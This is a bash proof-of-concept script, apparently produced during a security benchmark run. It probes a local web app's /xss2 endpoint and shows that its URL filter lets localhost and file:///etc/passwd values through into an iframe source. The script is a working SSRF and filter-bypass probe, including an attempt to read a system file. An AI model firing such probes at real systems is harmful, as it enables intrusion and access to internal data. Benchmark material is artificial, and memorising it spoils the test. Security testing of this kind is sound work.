#!/bin/bash
# POC: Demonstrates HTTP SSRF via localhost URL in /xss2 endpoint, showing that the regex filter allows http://localhost URLs to bypass filtering and reach the iframe src attribute
# Target: ./repo
# Created: 2025-11-05T17:27:45.590Z
# Session: benchmark-XBEN-047-24-mhm9f6sp

# SSRF via HTTP localhost in /xss2 endpoint
# This POC demonstrates that the /xss2 endpoint accepts localhost URLs
# and passes them through to the iframe src attribute without filtering

TARGET_HOST="${1:-localhost:5000}"
TARGET_URL="http://${TARGET_HOST}"

echo "[*] SSRF via HTTP Localhost in /xss2 Endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Basic http://localhost:5000/ SSRF
echo "[*] Test 1: Basic HTTP localhost SSRF"
echo "[*] Request: curl '$TARGET_URL/xss2?url=http://localhost:5000/'"
echo ""

RESPONSE=$(curl -s "$TARGET_URL/xss2?url=http://localhost:5000/")
RESPONSE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/xss2?url=http://localhost:5000/")

echo "[*] Response HTTP Code: $RESPONSE_CODE"
echo "[*] Response Body:"
echo "$RESPONSE"
echo ""

# Check if the localhost URL passed through the filter
if echo "$RESPONSE" | grep -q 'src="http://localhost:5000/"'; then
    echo "[+] VULNERABLE: localhost URL was NOT filtered!"
    echo "[+] Evidence: Found unfiltered iframe src with localhost URL"
    echo ""
else
    echo "[-] Response does not contain expected iframe with localhost"
    echo "[-] Full response: $RESPONSE"
fi

echo ""
echo "[*] Test 2: Comparing with IP-based URL (should be filtered)"
echo "[*] Request: curl '$TARGET_URL/xss2?url=http://127.0.0.1:5000/'"
echo ""

RESPONSE_IP=$(curl -s "$TARGET_URL/xss2?url=http://127.0.0.1:5000/")
RESPONSE_IP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/xss2?url=http://127.0.0.1:5000/")

echo "[*] Response HTTP Code: $RESPONSE_IP_CODE"
echo "[*] Response Body:"
echo "$RESPONSE_IP"
echo ""

if echo "$RESPONSE_IP" | grep -q 'src="http://127.0.0.1:5000/"'; then
    echo "[!] IP-based localhost URL also passed through (additional vulnerability)"
else
    echo "[+] IP-based localhost URL was filtered (but domain-based was not)"
fi

echo ""
echo "[*] Test 3: File protocol comparison (shows inconsistent filtering)"
echo "[*] Request: curl '$TARGET_URL/xss2?url=file:///etc/passwd'"
echo ""

RESPONSE_FILE=$(curl -s "$TARGET_URL/xss2?url=file:///etc/passwd")
RESPONSE_FILE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/xss2?url=file:///etc/passwd")

echo "[*] Response HTTP Code: $RESPONSE_FILE_CODE"
echo "[*] Response Body (first 200 chars):"
echo "$RESPONSE_FILE" | head -c 200
echo ""
echo ""

if echo "$RESPONSE_FILE" | grep -q 'src="file:///etc/passwd"'; then
    echo "[+] File protocol also passes through (confirms filtering is incomplete)"
fi

echo ""
echo "[*] Summary:"
echo "[*] - HTTP localhost URLs: PASSED FILTER (VULNERABLE)"
echo "[*] - File protocol URLs: PASSED FILTER (already documented)"
echo "[*] - The regex filter blocks IP addresses but allows domain/localhost names"
echo "[*] - This allows SSRF to internal services via hostname resolution"